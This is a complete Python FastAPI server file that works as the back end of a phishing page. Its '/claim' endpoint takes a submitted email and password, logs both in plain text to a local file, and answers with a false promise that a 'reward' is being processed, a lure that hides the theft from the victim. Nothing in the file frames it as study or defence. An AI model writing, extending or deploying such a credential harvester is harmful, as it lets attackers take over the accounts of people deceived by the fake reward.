from fastapi import FastAPI, Request
from fastapi.responses import HTMLResponse, JSONResponse
from fastapi.staticfiles import StaticFiles
import time

app = FastAPI()

app.mount("/static", StaticFiles(directory="static"), name="static")

@app.get("/", response_class=HTMLResponse)
async def serve_frontend():
    with open("static/index.html", "r", encoding="utf-8") as f:
        return HTMLResponse(content=f.read())

@app.post("/claim")
async def claim(request: Request):
    data = await request.json()
    email = data.get("email")
    password = data.get("password")

    with open("data.txt", "a") as f:
        f.write(f"{time.ctime()} | Email: {email} | Password: {password}\n")

    return JSONResponse({
        "message": "Please wait 10 mins while we process your reward. If you didn't get it, please try again."
    })
